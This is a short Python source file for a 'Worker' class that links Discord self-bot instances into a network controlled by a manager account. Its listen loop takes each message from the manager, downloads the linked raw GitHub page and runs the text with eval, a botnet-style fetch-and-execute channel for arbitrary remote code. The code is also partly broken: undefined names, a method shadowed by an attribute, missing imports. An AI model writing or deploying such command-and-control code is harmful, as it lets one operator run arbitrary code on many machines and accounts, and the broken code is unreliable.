# a layer
# makes the normal discord-self bot instance able to work in a network
"""
listens for orders from a Manager class
order must be a raw github page containing code to be executed
also, turn self.listen on here too if you want stats
"""

class Worker:

  def __init__(self, manager: int, base: int, **kwargs):
    # prefix for the userbot
    self.prefix = "!"

    # manager
    self.manager = manager

    # base
    self.base = base

    self.listen = kwargs.get("listen")
    

    # the bot instance made here can be interacted using instance.bot
    self.bot = commands.Bot(command_prefix=self.prefix)

  async def prep(self):
    await self.bot.wait_until_ready()
    self.base = self.bot.get_channel(base)


 
  async def listen(self):
    while True:
      order = await self.bot.wait_for("message", check=lambda m: m.author.id == self.manager and m.channel == base)
      page = requests.get(order.content).text
      eval(str(page))
